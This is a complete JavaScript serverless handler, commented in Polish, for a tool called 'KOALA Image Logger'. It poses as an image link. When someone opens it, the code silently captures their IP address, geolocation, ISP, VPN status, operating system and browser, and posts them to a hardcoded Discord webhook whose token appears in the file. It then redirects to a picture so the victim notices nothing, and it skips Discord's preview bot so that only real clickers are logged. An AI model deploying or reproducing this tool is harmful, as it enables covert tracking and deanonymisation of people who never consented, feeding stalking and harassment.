// ====================== KOALA IMAGE LOGGER ======================
// Działa jak hotdog-img.vercel.app – zwraca przekierowanie do obrazka

const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

// Obrazek, który będzie widoczny – stabilny, z Discorda
const IMAGE_URL = "https://cdn.discordapp.com/attachments/1054650838129332255/1153307620187312168/convert.png";

async function getGeoData(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
        const data = await res.json();
        if (data.status === 'success') return data;
    } catch {}
    return null;
}

export default async function handler(req, res) {
    // IP
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });

    // Geolokalizacja
    const geo = await getGeoData(ip);

    // Przygotuj wiadomość
    let message = `[+] KOALA Image Logger - IP Logged\nA User Opened the Original Image!\n\nEndpoint: /api/hotdog\n\nIP Info:\nIP: ${ip}\n`;
    if (geo) {
        message += `Provider: ${geo.isp || 'Unknown'}\nASN: ${geo.as || 'Unknown'}\nCountry: ${geo.country || 'Unknown'}\nRegion: ${geo.regionName || 'Unknown'}\nCity: ${geo.city || 'Unknown'}\nCoords: ${geo.lat?.toFixed(4) || '?'}, ${geo.lon?.toFixed(4) || '?'}\nTimezone: ${geo.timezone || 'Unknown'}\nMobile: ${geo.mobile ? 'True' : 'False'}\nVPN: ${geo.proxy ? 'True' : 'False'}\n`;
    } else {
        message += `Provider: Unknown\nASN: Unknown\nCountry: Unknown\nRegion: Unknown\nCity: Unknown\nCoords: ?, ?\nTimezone: Unknown\nMobile: False\nVPN: False\n`;
    }

    // Wykrywanie OS i przeglądarki
    const ua = userAgent.toLowerCase();
    let os = 'Unknown';
    if (ua.includes('windows nt 11.0')) os = 'Windows 11';
    else if (ua.includes('windows nt 10.0')) os = 'Windows 10';
    else if (ua.includes('mac os x')) os = 'macOS';
    else if (ua.includes('iphone')) os = 'iPhone iOS';
    else if (ua.includes('android')) os = 'Android';
    else if (ua.includes('linux')) os = 'Linux';

    let browser = 'Unknown';
    if (ua.includes('opr') || ua.includes('opera')) browser = 'Opera GX / Opera';
    else if (ua.includes('edg')) browser = 'Microsoft Edge';
    else if (ua.includes('chrome')) browser = 'Google Chrome';
    else if (ua.includes('firefox')) browser = 'Mozilla Firefox';
    else if (ua.includes('safari')) browser = 'Apple Safari';

    message += `\nPC Info:\nOS: ${os}\nBrowser: ${browser}\n\nUser Agent:\n${userAgent}`;

    // Wyślij webhook
    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
    if (!isDiscordBot) {
        try {
            await fetch(YOUR_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        } catch {}
    }

    // ========== KLUCZOWE: przekierowanie do obrazka ==========
    // Discord wyświetli link jako obrazek, bo odpowiedź to 302 -> obrazek
    res.redirect(302, IMAGE_URL);
}
